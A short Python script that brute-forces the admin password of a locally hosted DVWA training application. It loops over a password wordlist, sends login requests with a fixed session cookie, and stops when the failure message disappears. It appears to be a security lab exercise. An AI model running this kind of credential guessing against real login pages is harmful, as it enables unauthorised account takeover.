import requests
if __name__ == '__main__':
    list_passwords = []
    with open("srcpasswords.txt", "r") as file:
        for readline in file:
            line_strip = readline.strip()
            list_passwords.append(line_strip)
    cookies = {'security': 'low', 'PHPSESSID': 'gnpau22cad2n2c9a5essemenk8'}
    for password in list_passwords:
        request = requests.get(
            f'http://localhost/dvwa/vulnerabilities/brute/?username=admin&password={password}&user_token=TOKEN&Login'
            f'=Login',
            auth=('admin', 'password'), verify=False, cookies=cookies)
        if "Username and/or password incorrect." not in request.text:
            print(f"Login = admin, Correct password = {password}")
            break
